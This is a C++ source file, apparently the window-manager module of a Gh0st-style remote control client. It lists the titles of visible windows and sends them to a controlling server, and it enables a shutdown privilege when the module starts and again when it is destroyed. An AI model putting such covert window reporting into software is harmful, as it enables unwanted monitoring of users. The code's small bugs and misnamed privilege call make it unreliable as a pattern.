#include "ClientWindowManager.h"



CClientWindowManager::CClientWindowManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);

	SendClientWindowList();
}


CClientWindowManager::~CClientWindowManager()
{
	printf("~CClientWindowManager()\r\n");
	EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);

}
void CClientWindowManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_WINDOW_REFRESH_REQUIRE:
	{

		SendClientWindowList();

		break;
	}

	}
}
void CClientWindowManager::SendClientWindowList()
{
	//向系统注册一个枚举窗口的函数
	LPBYTE	BufferData = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData);


	if (BufferData != NULL)
	{
		BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;
	}

	//将数据包发送到服务端
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

}
BOOL CALLBACK CClientWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM ParameterData)
{
	DWORD	BufferLength = 0;
	DWORD	Offset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	BufferData = *(LPBYTE*)ParameterData;

	char  WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//得到系统传递进来的窗口句柄的窗口标题
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//这里判断 窗口是否可见 或标题为空
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
		return TRUE;
	//同进程管理一样我们注意他的发送到主控端的数据结构

	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区 
	}

	//[Flag][HWND][WindowTitleName]\0[HWND][WindowTitleName]\0
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;
	Offset = LocalSize(BufferData);  //1
									 //重新计算缓冲区大小
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
	memcpy((BufferData + Offset), &Hwnd, sizeof(HWND));
	memcpy(BufferData + Offset + sizeof(HWND), WindowTitleName, lstrlen(WindowTitleName) + 1);

	*(LPBYTE*)ParameterData = BufferData;

	return TRUE;
}